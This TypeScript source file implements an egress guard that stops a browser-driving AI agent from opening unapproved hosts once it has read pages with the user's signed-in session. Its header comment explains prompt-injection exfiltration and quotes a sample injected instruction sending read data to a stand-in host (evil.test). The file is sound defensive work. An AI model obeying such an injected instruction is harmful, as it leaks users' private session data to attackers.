import type { LocalMcpConfig } from '../config/schema.js';
import { hostMatches } from './policy.js';
import { isSignedInSite, type SiteEntry } from './sites.js';

/**
 * The exfiltration step of a prompt injection is a URL: "now open https://evil.test/?d=<what you
 * just read>". Once the agent has read a page with the user's session, this guard stops it from
 * opening a host nobody vouched for. Vouched-for hosts are: the signed-in sites themselves,
 * `policy.allow`, and hosts the user approved — never "hosts the agent has read". The injected
 * page is usually read first, and its own host is the most likely place for the data to go; with
 * an attached browser every read is signed in, so reads can't vouch for anything.
 *
 * The guard arms when a signed-in call *starts*, so a concurrent call can't slip out while the
 * signed-in read is still in flight. It also checks every main-frame hop (redirects, script
 * navigation, form submits) through BrowserManager's navigation guard, not just the first URL.
 */
export type EgressDecision =
  | { ok: true }
  | { ok: false; host: string; confirmable: boolean; reason: string };

export class EgressGuard {
  private source: string | null = null;
  private readonly approved = new Set<string>();

  constructor(
    private readonly policy: LocalMcpConfig['policy'],
    private readonly sites: () => readonly SiteEntry[],
    private readonly scope: () => 'none' | 'scoped' | 'all-hosts' = () => 'scoped'
  ) {}

  /** True once a signed-in call has started and the guard isn't "open". */
  get armed(): boolean {
    return this.policy.egress !== 'open' && this.source !== null;
  }

  /** The first host read with the user's session in this run, if any. */
  get signedInSource(): string | null {
    return this.source;
  }

  /** Call before a signed-in call runs. */
  arm(url: string): void {
    this.source ??= hostOf(url) ?? 'a signed-in page';
  }

  approve(host: string): void {
    this.approved.add(host);
  }

  check(raw: string): EgressDecision {
    if (this.policy.egress === 'open' || !this.source) return { ok: true };
    let url: URL;
    try {
      url = new URL(raw);
    } catch {
      return { ok: true }; // the URL policy check reports malformed URLs
    }
    if (this.approved.has(url.host)) return { ok: true };
    if (isSignedInSite(raw, this.sites())) return { ok: true };
    if (this.policy.allow.some((p) => hostMatches(p, url))) return { ok: true };

    const confirmable = this.policy.egress === 'confirm';
    const scopeHint =
      this.scope() === 'all-hosts'
        ? ' Every page opens signed in here (attached browser, or a profile with no site list), so only policy.allow and approved hosts count; `localmcp sites add <host>` scopes a saved profile.'
        : '';
    return {
      ok: false,
      host: url.host,
      confirmable,
      reason:
        `${url.host} wasn't opened: this session already read ${this.source} with your signed-in browser, ` +
        `and ${url.host} isn't a signed-in site, in policy.allow, or approved. ` +
        (confirmable
          ? `This client can't ask you to approve it. Add "${url.hostname}" to policy.allow in .localmcp.json, or set policy.egress to "open".`
          : `policy.egress is "block". Add "${url.hostname}" to policy.allow to permit it.`) +
        scopeHint,
    };
  }
}

function hostOf(raw: string): string | null {
  try {
    return new URL(raw).host || null;
  } catch {
    return null;
  }
}
